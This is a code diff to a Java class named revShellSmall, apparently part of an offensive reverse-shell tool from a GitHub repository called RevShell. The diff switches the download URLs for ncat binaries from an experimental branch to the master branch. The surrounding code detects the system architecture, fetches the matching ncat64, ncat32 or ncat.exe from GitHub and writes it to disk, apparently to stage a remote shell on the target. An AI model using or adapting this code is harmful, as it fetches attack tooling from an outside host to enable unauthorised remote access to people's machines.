@@ -25,9 +25,9 @@ public class revShellSmall {
 
 		//Check for 64 / 32 bit and then set website accordingly //TODO dynamic version if this fails
 		if(arch.contains("64") || arch.contains("x86")){
-			website = new URL("https://github.com/Hashdump/RevShell/raw/experimental/Resources/ncat64");
+			website = new URL("https://github.com/Hashdump/RevShell/raw/master/Resources/ncat64");
 		}else{
-			website = new URL("https://github.com/Hashdump/RevShell/raw/experimental/Resources/ncat32");
+			website = new URL("https://github.com/Hashdump/RevShell/raw/master/Resources/ncat32");
 		}
 		//Create byte channel for creating binary
 		ReadableByteChannel rbc = Channels.newChannel(website.openStream());
@@ -75,7 +75,7 @@ public class revShellSmall {
 		String pwd = System.getProperty("user.dir");
 		URL website = null;
 
-		website = new URL("https://github.com/Hashdump/RevShell/raw/experimental/Resources/ncat.exe");
+		website = new URL("https://github.com/Hashdump/RevShell/raw/master/Resources/ncat.exe");
 		ReadableByteChannel rbc = Channels.newChannel(website.openStream());
 		FileOutputStream fos = new FileOutputStream("ncat.exe");
 		fos.getChannel().transferFrom(rbc, 0, Long.MAX_VALUE);
